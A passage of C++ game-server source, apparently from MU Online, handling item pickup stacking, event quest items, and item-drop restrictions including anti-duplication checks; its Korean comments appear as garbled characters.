#ifdef MODIFY_KALIMA_KUNDUNMARK_DROP_01_20040906
					INT iInventoryIndex = g_KalimaGate.CheckOverlapKundunMark(aIndex, lpItem->m_Level);
#else
					INT iInventoryIndex = g_KalimaGate.CheckOverlapKundunMark(aIndex);
#endif
					if (CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY)) {
						// ���� �������� ��ĥ �� �ִ� �ڸ��� �����Ƿ� ���� (������)�� + ��Ų��.
						if( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
						{
							// ����� ǥ���� ������ ���� Get �αװ� ������ �Ѵ�.
							BYTE NewOption[8];

							ItemIsBufExOption(NewOption, lpItem);

#ifdef MODIFY_LOG_SYSTEM_2_3_20060828
							LogAddTD(lMsg.Get(477),
								gObj[aIndex].AccountID, 
								gObj[aIndex].Name, 
								map_num, 
								gObj[aIndex].X, 
								gObj[aIndex].Y, 
								lpItem->m_Number, 
								szItemName, 
								type, 
								level, 
								lpItem->m_Option1, 
								lpItem->m_Option2, 
								lpItem->m_Option3,
								(int)lpItem->m_Durability,
								NewOption[0],
								NewOption[1],
								NewOption[2],
								NewOption[3],
								NewOption[4],
								NewOption[5],
								NewOption[6],
								lpItem->m_SetOption,
								lpItem->m_ItemOptionEx>>7,
								g_kJewelOfHarmonySystem.GetItemStrengthenOption( lpItem ),
								g_kJewelOfHarmonySystem.GetItemOptionLevel( lpItem )
								);
#else
							LogAddTD(lMsg.Get(477),
								gObj[aIndex].AccountID, 
								gObj[aIndex].Name, 
								map_num, 
								gObj[aIndex].X, 
								gObj[aIndex].Y, 
								lpItem->m_Number, 
								szItemName, 
								type, 
								level, 
								lpItem->m_Option1, 
								lpItem->m_Option2, 
								lpItem->m_Option3,
								NewOption[0],
								NewOption[1],
								NewOption[2],
								NewOption[3],
								NewOption[4],
								NewOption[5],
								NewOption[6],
								lpItem->m_SetOption
								);
#endif // MODIFY_LOG_SYSTEM_2_3_20060828


//							pResult.result	= iInventoryIndex;
							pResult.result	= 0xFD;				// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
							DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
							gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;

							if (gObj[aIndex].pInventory[iInventoryIndex].m_Durability >= MAX_KALIMAGATE_STONE_OVERLAP) {
								// ����� ǥ���� 20�� ������� �Ҿ���� ������ ���Ѵ�.
								// ### 20040906 (apple) 10���� ���� 
								INT iDurGap = gObj[aIndex].pInventory[iInventoryIndex].m_Durability - MAX_KALIMAGATE_STONE_OVERLAP;

								// ����� ǥ�� (20��)�� �����ϰ� 
								// ### 20040906 (apple) 10���� ����
								gObjInventoryItemSet(aIndex, iInventoryIndex, 0xFF);
								gObj[aIndex].pInventory[iInventoryIndex].Clear();
								GCInventoryItemDeleteSend(aIndex, iInventoryIndex, 1);

#ifdef MODIFY_KALIMA_KUNDUNMARK_DROP_01_20040906
								// �Ҿ���� ������ ����ִ´�.
								ItemSerialCreateSend(
									aIndex, 
									ITEMMAKE_INVENTORY_1CELL, 
									(BYTE)gObj[aIndex].X, 
									(BYTE)gObj[aIndex].Y, 
									ItemGetNumberMake(14, 28), 
									lpItem->m_Level
									, (BYTE)0, 0, 0, 0, aIndex);
#else
								// �Ҿ���� ������ ����ִ´�.
								ItemSerialCreateSend(
									aIndex, 
									ITEMMAKE_INVENTORY_1CELL, 
									(BYTE)gObj[aIndex].X, 
									(BYTE)gObj[aIndex].Y, 
									ItemGetNumberMake(14, 28), 
									0, (BYTE)0, 0, 0, 0, aIndex);

#endif
								LogAddTD("[Kalima] [%s][%s] Make Lost Kalima Map (Left Kundun Mark:%d)", 
									gObj[aIndex].AccountID,
									gObj[aIndex].Name,
									iDurGap
									);

								if (iDurGap > 0) {			// ���� ���� ����� ������ �����Ǹ� �ٽ� ����Ѵ�.
									lpItem->m_State			= OBJST_PLAYING;
									lpItem->Give			= 0;
									lpItem->live			= 1;
									lpItem->m_Durability	= iDurGap;
									continue;
								}
							}
							else {
								GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
							}
							return;
						}
					}
					else {
						// ��ĥ �� �ִ� �ڸ��� �����Ƿ� ���� �������� �ִ� ������� �ִ´�.
						break;
					}
				}
			}
#endif

#ifdef MU_CASTLESIEGE_CS_MARKS_20041214		// ������ ǥ���� �ֿ��� �� ���������� �Ѵ�.
			if ((lpItem->m_Type == MAKE_ITEMNUM(14, 21)) && (lpItem->m_Level == 3)) {
				for (INT iLoop = 0 ; iLoop < MAX_INVENTORY ; iLoop++) {
					INT iInventoryIndex	= g_CastleSiegeSync.CheckOverlapCsMarks(aIndex);
					if (CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY)) {
						INT iItemDur	= gObj[aIndex].pInventory[iInventoryIndex].m_Durability + lpItem->m_Durability;
						if (iItemDur <= MAX_CS_SYNC_MARKS_OVERLAP) {
							// �� �ڸ��� �� ��������.
							if( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
							{
								pResult.result	= 0xFD;				// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
								DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
								gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;

								GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
								return;
							}
						}
						else {
							// ��ġ�� ���� ���´�.
							lpItem->m_Durability	= iItemDur - MAX_CS_SYNC_MARKS_OVERLAP;
							gObj[aIndex].pInventory[iInventoryIndex].m_Durability = MAX_CS_SYNC_MARKS_OVERLAP;

							GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
						}
					}
					else {
						// ��ĥ �� �ִ� �ڸ��� �����Ƿ� ���� �������� �ִ� ������� �ִ´�.
						break;
					}
				}
			}
#endif

#ifdef UPDATE_LUCKY_COIN_EVENT_20081029	// ����� ���� �ֿ��� ��� ��ġ��
			if (lpItem->m_Type == MAKE_ITEMNUM(14, 100))
			{
				for (INT iLoop = MAX_EQUIPMENT; iLoop < MAX_INVENTORY; iLoop++) 
				{
					INT iInventoryIndex = -1;
					if(gObj[aIndex].pInventory[iLoop].m_Type == MAKE_ITEMNUM(14, 100) &&
						gObj[aIndex].pInventory[iLoop].m_Durability < MAX_OVERLAP_LUCKY_COIN)
					{
						iInventoryIndex = iLoop;
					}

					if (CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY)) {
						INT iItemDur	= gObj[aIndex].pInventory[iInventoryIndex].m_Durability + lpItem->m_Durability;
						if (iItemDur <= MAX_OVERLAP_LUCKY_COIN) {
							// �� �ڸ��� �� ��������.
							if( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
							{
								pResult.result	= 0xFD;				// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
								DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
								gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;

								GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
								return;
							}
						}
						else 
						{
							// ��ġ�� ���� ���´�.
							lpItem->m_Durability	= iItemDur - MAX_OVERLAP_LUCKY_COIN;
							gObj[aIndex].pInventory[iInventoryIndex].m_Durability = MAX_OVERLAP_LUCKY_COIN;

							GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
						}
					}
					else 
					{
						// ��ĥ �� �ִ� �ڸ��� �����Ƿ� ���� �������� �ִ� ������� �ִ´�.
						//break;
					}
				}
			}
#endif	// UPDATE_LUCKY_COIN_EVENT_20081029

			pResult.result = gObjInventoryInsertItemTemp(&gObj[aIndex], lpItem);
		
			if( pResult.result != 0xFF ) 
			{
#ifdef ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
				ItemByteConvert(pResult.Data, lpItem->m_Type, lpItem->m_Option1, lpItem->m_Option2, lpItem->m_Option3, (BYTE)lpItem->m_Level, (BYTE)lpItem->m_Durability, (BYTE)lpItem->m_NewOption, (BYTE)lpItem->m_SetOption, lpItem->m_JewelOfHarmonyOption, lpItem->m_ItemOptionEx, lpItem->m_SocketOption, lpItem->m_BonusSocketOption );
#else
	#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
		#ifdef ADD_380ITEM_NEWOPTION_20060711
				ItemByteConvert(pResult.Data, lpItem->m_Type, lpItem->m_Option1, lpItem->m_Option2, lpItem->m_Option3, (BYTE)lpItem->m_Level, (BYTE)lpItem->m_Durability, (BYTE)lpItem->m_NewOption, (BYTE)lpItem->m_SetOption, lpItem->m_JewelOfHarmonyOption, lpItem->m_ItemOptionEx);
		#else
				ItemByteConvert(pResult.Data, lpItem->m_Type, lpItem->m_Option1, lpItem->m_Option2, lpItem->m_Option3, (BYTE)lpItem->m_Level, (BYTE)lpItem->m_Durability, (BYTE)lpItem->m_NewOption, (BYTE)lpItem->m_SetOption, lpItem->m_JewelOfHarmonyOption);
		#endif // ADD_380ITEM_NEWOPTION_20060711
	#else
		#ifdef ADD_380ITEM_NEWOPTION_20060711
				ItemByteConvert(pResult.Data, lpItem->m_Type, lpItem->m_Option1, lpItem->m_Option2, lpItem->m_Option3, (BYTE)lpItem->m_Level, (BYTE)lpItem->m_Durability, (BYTE)lpItem->m_NewOption, (BYTE)lpItem->m_SetOption, lpItem->m_ItemOptionEx);
		#else
				ItemByteConvert(pResult.Data, lpItem->m_Type, lpItem->m_Option1, lpItem->m_Option2, lpItem->m_Option3, (BYTE)lpItem->m_Level, (BYTE)lpItem->m_Durability, (BYTE)lpItem->m_NewOption, (BYTE)lpItem->m_SetOption);
		#endif // ADD_380ITEM_NEWOPTION_20060711
	#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
#endif // ADD_ITEM_SOCKET_OPTION_EXTEND_20080422

				if( MapC[map_num].ItemGive(aIndex, item_num) == TRUE )
				{
					BYTE Ret = gObjInventoryInsertItem(aIndex, lpItem);
					if(Ret == 0xFF)
					{
						pResult.result = 0xFF;
					}
					//pResult.h.size -= 1;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					if( Ret == 0xFF) 
					{
						GCItemListSend(aIndex);
						//GCServerMsgStringSend("������ �ߺ� �ڵ� Ȯ������ ���� �����Ǿ����ϴ�.", aIndex, 1);
					}
					else
					{
						BYTE NewOption[8];
						
						ItemIsBufExOption(NewOption, lpItem);

#ifdef MODIFY_LOG_SYSTEM_2_3_20060828
						LogAddTD(lMsg.Get(477),
							gObj[aIndex].AccountID, 
							gObj[aIndex].Name, 
							map_num, 
							gObj[aIndex].X, 
							gObj[aIndex].Y, 
							lpItem->m_Number, 
							szItemName, 
							type, 
							level, 
							lpItem->m_Option1, 
							lpItem->m_Option2, 
							lpItem->m_Option3,
							(int)lpItem->m_Durability,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							lpItem->m_SetOption,
							lpItem->m_ItemOptionEx>>7,
							g_kJewelOfHarmonySystem.GetItemStrengthenOption( lpItem ),
							g_kJewelOfHarmonySystem.GetItemOptionLevel( lpItem )
							);
#else
						LogAddTD(lMsg.Get(477),
							gObj[aIndex].AccountID, 
							gObj[aIndex].Name, 
							map_num, 
							gObj[aIndex].X, 
							gObj[aIndex].Y, 
							lpItem->m_Number, 
							szItemName, 
							type, 
							level, 
							lpItem->m_Option1, 
							lpItem->m_Option2, 
							lpItem->m_Option3,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							lpItem->m_SetOption
							);
#endif // MODIFY_LOG_SYSTEM_2_3_20060828

						#ifdef SEND_GETITEMINFO_FOR_MYPARTY	// ��Ƽ������ ������
							GCSendGetItemInfoForParty(aIndex, lpItem);
						#endif



#ifdef FOR_BLOODCASTLE
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����							
						if (CHECK_BLOODCASTLE(map_num)) {
							int iBridgeIndex = g_BloodCastle.GetBridgeIndexByMapNum( map_num );
							if (g_BloodCastle.CheckQuestItemSerial(iBridgeIndex, lpItem)) {
								// ������ ����ĳ�� ���󿡼� ���� ���빫�⸦ �����Ͽ���.
								g_BloodCastle.m_BridgeData[iBridgeIndex].m_iBC_QUEST_ITEM_USER_INDEX = gObj[aIndex].m_Index;

								// ����鿡�� ������ ��õ���� ���빫�⸦ �־��ٴ� ������ �Ѵ�.
								int iUserBridgeIndex = g_BloodCastle.GetBridgeIndexByMapNum( gObj[aIndex].MapNumber );
								CHAR szWEAPON_NAME[128];
								switch(lpItem->m_Level) {
								case 0:
									wsprintf(szWEAPON_NAME, lMsg.Get(1174), gObj[aIndex].Name);		// "%s ���� ��õ���� ���������̸� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(iUserBridgeIndex, szWEAPON_NAME);
									break;
								case 1:
									wsprintf(szWEAPON_NAME, lMsg.Get(1175), gObj[aIndex].Name);		// "%s ���� ��õ���� ������� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(iUserBridgeIndex, szWEAPON_NAME);
									break;
								case 2:
									wsprintf(szWEAPON_NAME, lMsg.Get(1176), gObj[aIndex].Name);		// "%s ���� ��õ���� ���뼮���� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(iUserBridgeIndex, szWEAPON_NAME);
									break;
								default:
									szWEAPON_NAME[0] = '\0';
									break;
								}
								
								LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) picked up Angel King's Weapon (%d)", 
									iBridgeIndex +1, 
									gObj[aIndex].AccountID, 
									gObj[aIndex].Name, 
									lpItem->m_Level);
							}
						}
#else	// ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010							
						if (CHECK_BLOODCASTLE(map_num)) {
							if (g_BloodCastle.CheckQuestItemSerial(map_num - MAP_INDEX_BLOODCASTLE1, lpItem)) {
								// ������ ����ĳ�� ���󿡼� ���� ���빫�⸦ �����Ͽ���.
								g_BloodCastle.m_BridgeData[map_num - MAP_INDEX_BLOODCASTLE1].m_iBC_QUEST_ITEM_USER_INDEX = gObj[aIndex].m_Index;

								// ����鿡�� ������ ��õ���� ���빫�⸦ �־��ٴ� ������ �Ѵ�.
								CHAR szWEAPON_NAME[128];
								switch(lpItem->m_Level) {
								case 0:
									wsprintf(szWEAPON_NAME, lMsg.Get(1174), gObj[aIndex].Name);		// "%s ���� ��õ���� ���������̸� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1, szWEAPON_NAME);
									break;
								case 1:
									wsprintf(szWEAPON_NAME, lMsg.Get(1175), gObj[aIndex].Name);		// "%s ���� ��õ���� ������� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1, szWEAPON_NAME);
									break;
								case 2:
									wsprintf(szWEAPON_NAME, lMsg.Get(1176), gObj[aIndex].Name);		// "%s ���� ��õ���� ���뼮���� �����ϼ̽��ϴ�."
									g_BloodCastle.SendNoticeMessage(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1, szWEAPON_NAME);
									break;
								default:
									szWEAPON_NAME[0] = '\0';
									break;
								}
								
								LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) picked up Angel King's Weapon (%d)", 
									map_num - MAP_INDEX_BLOODCASTLE1 +1, 
									gObj[aIndex].AccountID, 
									gObj[aIndex].Name, 
									lpItem->m_Level);
							}
						}
#endif	// ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010
#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ������ �ֿ����� �κ� ��ġ�� ����
						if( CHECK_ILLUSION_TEMPLE(map_num) && MAKE_ITEMNUM(14, 64) == lpItem->m_Type)
						{
							g_IllusionTempleEvent.SetInventoryPos(gObj[aIndex].MapNumber, aIndex, Ret);
							g_IllusionTempleEvent.SendRelicsUser(&gObj[aIndex]);
										
#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_3_20070731
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
							LogAddTD("[Illusion Temple] (%d) (Account:%s, Name:%s) picked up Relics Item(serial:%u)", 
	#else
							LogAddTD("[Illusion Temple] (%d) (Account:%s, Name:%s) picked up Relics Item(serial:%d)", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
									map_num - MAP_INDEX_ILLUSION_TEMPLE1 +1, 
									gObj[aIndex].AccountID, 
									gObj[aIndex].Name, lpItem->m_Number);
#else
							LogAddTD("[Illusion Temple] (%d) (Account:%s, Name:%s) picked up Relics Item", 
									map_num - MAP_INDEX_ILLUSION_TEMPLE1 +1, 
									gObj[aIndex].AccountID, 
									gObj[aIndex].Name);
#endif
						}
#endif
					}
				}
				else
				{
					// �������� ���� �׻� �Ծ���.
					pResult.result = 0xFF;
					pResult.h.size -= ITEM_BUFFER_SIZE;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				}
			}
			else 
			{
				pResult.result = 0xFF;
				pResult.h.size -= ITEM_BUFFER_SIZE;
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			}			
		}		
	}
	else 
	{
		pResult.h.size -= ITEM_BUFFER_SIZE;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
//		LogAdd("error-L3 : %s %d", __FILE__, __LINE__);
	}
}

//----------------------------------------------------------------------------
// [0x23] ������ �������� �����ڴٰ� ��û 
// type : 0 = ������ 
//        1 = �׾ ������
//----------------------------------------------------------------------------
BOOL CGItemDropRequest(LPPMSG_ITEMTHROW lpMsg, int aIndex, int drop_type)
{
	int CopyItem=0;
	BYTE NewOption[8];
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return FALSE;

	PMSG_ITEMTHROW_RESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x23, sizeof( pResult ));
	pResult.Result		= 0x01;
	pResult.Ipos		= lpMsg->Ipos;		

	if( gObj[aIndex].m_IfState.use )
	{
		if( gObj[aIndex].m_IfState.type != I_SHOP ) 
		{
			pResult.Result = 0x00;
			return FALSE;
		}
	}

	// �������̸� ��Ӿȵǰ�..
	if( gObj[aIndex].CloseType != -1 ) 
	{
		pResult.Result = 0x00;		
	}

#ifdef MODIFY_ITEM_DUPLICATION_USING_ITEMDROP_20060518
	if( gObj[aIndex].m_bMapSvrMoveQuit == true )
	{
		// �α� �߰�
		LogAddTD("[ANTI-HACK][Item Duplication] - Item Drop during MapServer Move [%s][%s]",
			gObj[aIndex].AccountID, gObj[aIndex].Name );
		pResult.Result = 0x00;
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - �������� ���� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� �������� ���� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGItemDropRequest() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		pResult.Result = 0x00;
		return FALSE;
	}
#endif
	
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	if( lpMsg->Ipos == 0xFF ) 
	{
		LogAdd("error:%s %d", __FILE__, __LINE__);
		pResult.Result = 0x00;
	}
	
	if( lpMsg->Ipos < 0 || lpMsg->Ipos > MAX_INVENTORY-1 ) 
		pResult.Result = 0x00;
	
	if( gObjCanItemTouch(lpObj, 0) == FALSE )	// �������� �̵��� �� ���ٸ�
	{
		pResult.Result = 0x00;		
	}

#ifdef NEW_SKILL_FORSKYLAND
	if( gObj[aIndex].MapNumber == 10 )
	{	// ����ڰ� õ���� ����
		if( lpMsg->Ipos == EQUIPMENT_HELPER  )
		{
			if( lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(13,3) )
			{	// �䰡�ý��� �������� �Ѵ�
				if( !lpObj->pInventory[EQUIPMENT_WING].IsItem() )
				{	// ������ ���� ������ �� ���´�
					pResult.Result = 0x00;		
				}
			}	
		}
		else if( lpMsg->Ipos == EQUIPMENT_WING )
		{	// ������ �������� �Ѵ�
			if( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM(13,3) )
			{	// �䰡�ý��� ���� ������ �� ���´�
				pResult.Result = 0x00;
			}
		}
	}	
#endif
	
#ifdef ADD_NON_DROP_VALUABLE_ITEM_20060518
	if( (lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(12,30))			// �༮����
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(12,31))		// ��������
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(13,36))		// �η��� ���Ǹ�
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(13,37))		// �渱�� ���Ǹ�
		)
	{
		pResult.Result = 0x00;
	}
#endif

#ifdef UPDATE_GM_FUNCTION_20070228	// GM ĳ���� ���Ź����� ���� �� ���� 
	if( lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(13, 42) )
	{
		pResult.Result = 0x00;
	}
#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ȯ�� ��� �ȿ����� ���� �η縶���� ���� �� ����, ������ ������ ����
	if( CHECK_ILLUSION_TEMPLE(lpObj->MapNumber) 
		&&lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(13, 51) )	// ȯ�� ����ȿ������� �η縶��
	{
		pResult.Result = 0x00;
	}

	if( lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(14, 64) )		// ����
	{
		pResult.Result = 0x00;
	}
#endif

#ifdef ADD_THIRD_WING_20070525	// 3�� ������ ��������.
	if( lpObj->pInventory[lpMsg->Ipos].m_Type >= ITEM_WING+36 
		&& lpObj->pInventory[lpMsg->Ipos].m_Type <= ITEM_WING+40 )	// 3������
	{
#ifdef MODIFY_VALUABLE_ITME_BUGFIX_20070828
		if (!gPkLimitFree)
#endif		
		pResult.Result = 0x00;
	}
#endif
#ifdef ADD_THIRD_WING_20070525	// �ܵ����Ǳ���, �ܵ����ǺҲ��� ��������.
	if( ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEM_HELPER + 52 )		// �ܵ����Ǳ���
		|| ( lpObj->pInventory[lpMsg->Ipos].m_Type == ITEM_HELPER + 53 ) )	// �ܵ����Ǳ���
	{
		pResult.Result = 0x00;
	}
#endif

#ifdef UPDATE_VALUABLE_ITEM_20070307	// ���� �������� ������ ����
	if( (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+13 || 
		lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+14 || 
		lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+16 ) ||  // �༮, ����, ����.
		(lpObj->pInventory[lpMsg->Ipos].m_Type>=ITEM_WING && 
		lpObj->pInventory[lpMsg->Ipos].m_Type<=ITEM_WING+6 ) ||		// ����.
		(lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_WING+15 )||	// ȥ���� ����.
		((lpObj->pInventory[lpMsg->Ipos].m_Level >= 7 && lpObj->pInventory[lpMsg->Ipos].m_Type < ITEM_WING) // ���� 7�̻��� ������
		|| (lpObj->pInventory[lpMsg->Ipos].IsSetItem())				// ��Ʈ
		|| (lpObj->pInventory[lpMsg->Ipos].IsExtItem()) )			// ������Ʈ	
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_HELPER+14)	// ��ũ�� ����
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_HELPER+19)	// ��õ�������빫��
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_HELPER+15)	// ����
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_HELPER+34)	// �ͼ��� ����
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+31)	// ��ȣ����
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+41)	// ������
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+42)	// ��ȭ�Ǻ���
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+43)	// �ϱ� ���¼�
		|| (lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+44)	// ��� ���ü�		
#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// �ű�ĳ���� 1������(����� ����)�� ������ ����
		|| lpObj->pInventory[lpMsg->Ipos].m_Type == ITEM_WING+41	// �ű�ĳ���� 1������(����� ����)
#endif
#ifdef ADD_SUMMONER_SECOND_THIRD_WING_20071130	// ������ ���� ������ ������ ���� �� ����
		|| lpObj->pInventory[lpMsg->Ipos].m_Type == ITEM_WING+42	// �ű�ĳ���� 2������(������ ����)
		|| lpObj->pInventory[lpMsg->Ipos].m_Type == ITEM_WING+43	// �ű�ĳ���� 3������(������ ����)
#endif		
		)
	{
#ifdef MODIFY_VALUABLE_ITME_BUGFIX_20070828
		if (!gPkLimitFree)
#endif
		pResult.Result = 0x00;
	}
#else // UPDATE_VALUABLE_ITEM_20070307
//#if TESTSERVER == 0
	if( (lpObj->pInventory[lpMsg->Ipos].m_Type>=ITEM_HELPER && 
		 lpObj->pInventory[lpMsg->Ipos].m_Type<=ITEM_HELPER+3 ) ||	//  ��ȣ, ��ź.
		(lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+13 || 
		 lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+14 || 
		 lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_POTION+16 ) ||   //  �༮, ����, ����.
		(lpObj->pInventory[lpMsg->Ipos].m_Type>=ITEM_WING && 
		 lpObj->pInventory[lpMsg->Ipos].m_Type<=ITEM_WING+6 ) || //  ����.
		(lpObj->pInventory[lpMsg->Ipos].m_Type==ITEM_WING+15 )|| //  ȥ���� ����.
		((lpObj->pInventory[lpMsg->Ipos].m_Level>4 && lpObj->pInventory[lpMsg->Ipos].m_Type < ITEM_WING) || 		
		(lpObj->pInventory[lpMsg->Ipos].IsSetItem()) ||
		 (lpObj->pInventory[lpMsg->Ipos].IsExtItem()) ) ) //  ���� 4�̻��� ������.
		{
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
			if (!gPkLimitFree)
#endif
			pResult.Result = 0x00;
		}
#endif	// UPDATE_VALUABLE_ITEM_20070307
//#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
	// ��ȭ�� �������� ��ȭ�� �������� ���� �� ����.
	if( g_kJewelOfHarmonySystem.IsStrengthenByJewelOfHarmony( &lpObj->pInventory[lpMsg->Ipos] ) == TRUE )
	{
		pResult.Result = 0x00;
#ifdef ADD_JEWEL_OF_HARMONY_WTFMESSAGE_20060818
		GCServerMsgStringSend(lMsg.Get(3371), lpObj->m_Index, 1); // ��ȭ�� �������� ���� �� �����ϴ�.
#endif
	}
	// ��ȭ�Ǻ���(����/������). ���ü� �������� ���� �� ����.
	if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonyOriginal( lpObj->pInventory[lpMsg->Ipos].m_Type )
		|| g_kJewelOfHarmonySystem.IsJewelOfHarmonyPurity( lpObj->pInventory[lpMsg->Ipos].m_Type )
		|| g_kJewelOfHarmonySystem.IsJewelOfHarmonySmeltingItems( lpObj->pInventory[lpMsg->Ipos].m_Type )
		)
	{
		pResult.Result = 0x00;
	}
#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530	

#ifdef ADD_ELITE_SKELETON_WORRIOR_CHANGE_RING_20060830	// �ٴڿ� ������ ����
	if( lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM( 13, 39 ) )
	{
		// ����Ʈ�ذ����纯�Ź����� �ٴڿ� ���� �� ����.
		pResult.Result = 0x00;
	}
#endif

#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
	if( IsCashItem( lpObj->pInventory[lpMsg->Ipos].m_Type ) == TRUE )
	{
		pResult.Result = 0x00;
	}
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
	
#ifdef PREMIUMITEM_20090106
	// �����̾� �������� ���� �� ����.
	if(	IsPremiumItem( lpObj->pInventory[lpMsg->Ipos].m_Type ) == TRUE )
	{
		pResult.Result = 0x00;
	}
#endif // PREMIUMITEM_20090106
	
#ifndef FOR_KOREA
#ifdef ADD_PREMIUMITEM_PANDA
	if( lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM( 13, 76)		// �Ҵ����Ź���
		|| lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM( 13, 80)	// �Ҵ���
		)
	{
		pResult.Result = 0x00;
	}
#endif // ADD_PREMIUMITEM_PANDA
#endif // NOT_FOR_KOREA
	
#ifdef ADD_NEWPVP_PKFIELD
	if (drop_type == 0 &&lpObj->pInventory[lpMsg->Ipos].m_Type == MAKE_ITEMNUM(14, 28))
	{
		if (g_NewPVP.IsDuel(*lpObj))
		{
